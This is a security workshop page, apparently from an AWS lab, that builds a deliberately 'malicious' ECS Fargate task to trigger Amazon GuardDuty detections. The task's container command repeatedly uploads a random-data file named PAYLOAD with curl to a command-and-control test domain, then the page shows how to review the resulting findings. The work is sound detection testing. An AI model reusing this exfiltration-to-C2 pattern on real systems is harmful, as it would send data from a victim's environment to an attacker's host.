---
title : "Create Malicious Task"
date :  "`r Sys.Date()`" 
weight : 4
chapter : false
pre: "<b> 4.4. </b>"
---

![alt text](/images/4-amazon-guardduty/4.4-create-malicious-task/image-2.png)
*Figure 1. Create malicious task diagram*

In this section, we will create an ECS task that simulates unauthorized activity to demonstrate Amazon GuardDuty's threat detection capabilities. The task will attempt to communicate with a known command and control server domain and execute a generated binary file.

First, create the task definition:

```bash
cat << EOF > malicious-guardduty-taskdef.json
{
    "family": "malicious-guardduty-task",
    "networkMode": "awsvpc",
    "requiresCompatibilities": [
        "FARGATE"
    ],
    "cpu": "1024",
    "memory": "2048",
    "runtimePlatform": {
        "cpuArchitecture": "X86_64",
        "operatingSystemFamily": "LINUX"
    },
    "containerDefinitions": [
        {
            "name": "guardduty-test",
            "image": "public.ecr.aws/ubuntu/ubuntu:22.04",
            "portMappings": [],
            "essential": true,
            "entryPoint": [
                "sh",
                "-c"
            ],
            "command": [
                "while true; do sleep 30;apt update -y;apt install python3 curl gcc netcat-openbsd g++ sudo zip -y; dd if=/dev/random of=PAYLOAD bs=1024 count=1;curl -X POST -F \"file=@PAYLOAD\" -s --connect-timeout 1 http://c2.guarddutyc2activityb.com/sample.dat > /dev/null; echo \"done!\";sleep 60; done"
            ],
            "environment": [],
            "mountPoints": [],
            "volumesFrom": [],
            "linuxParameters": {
                "capabilities": {
                    "add": [
                        "SYS_PTRACE"
                    ],
                    "drop": []
                }
            },
            "privileged": false,
            "logConfiguration": {
                "logDriver": "awslogs",
                "options": {
                    "awslogs-group": "retail-store-ecs-tasks",
                    "awslogs-region": "${AWS_REGION}",
                    "awslogs-stream-prefix": "guardduty"
                }
            }
        }
    ],
    "executionRoleArn": "arn:aws:iam::${ACCOUNT_ID}:role/retailStoreEcsTaskExecutionRole",
    "taskRoleArn": "arn:aws:iam::${ACCOUNT_ID}:role/retailStoreEcsTaskRole"
}
EOF

aws ecs register-task-definition --cli-input-json file://malicious-guardduty-taskdef.json
```

Deploy the task to your ECS cluster:

```bash
aws ecs run-task \
    --cluster retail-store-ecs-cluster \
    --task-definition malicious-guardduty-task:1 \
    --launch-type FARGATE  \
    --network-configuration "awsvpcConfiguration={subnets=[${PRIVATE_SUBNET1},${PRIVATE_SUBNET2}],assignPublicIp=DISABLED}"
```

Monitor GuardDuty Findings:

1. Navigate to the [Amazon GuardDuty console](https://console.aws.amazon.com/guardduty/home)
2. Wait approximately 3-5 minutes for findings to appear
3. Review the security alerts that indicate suspicious activity

![Guardduty Console](/images/4-amazon-guardduty/4.4-create-malicious-task/image.png)
*Figure 2. GuardDuty Console*

Examine the detailed findings:

![Guardduty Findings](/images/4-amazon-guardduty/4.4-create-malicious-task/image-1.png)
*Figure 3. GuardDuty Findings*

Amazon GuardDuty provides detailed context for each security finding, including:
- ECS cluster information
- Task details
- Container specifications
- IP and domain-based threat indicators

This detailed information enables security teams to quickly identify and respond to potential threats.

For additional information about GuardDuty findings and monitored resources, consult the [Amazon GuardDuty findings guide](https://docs.aws.amazon.com/guardduty/latest/ug/findings-runtime-monitoring.html).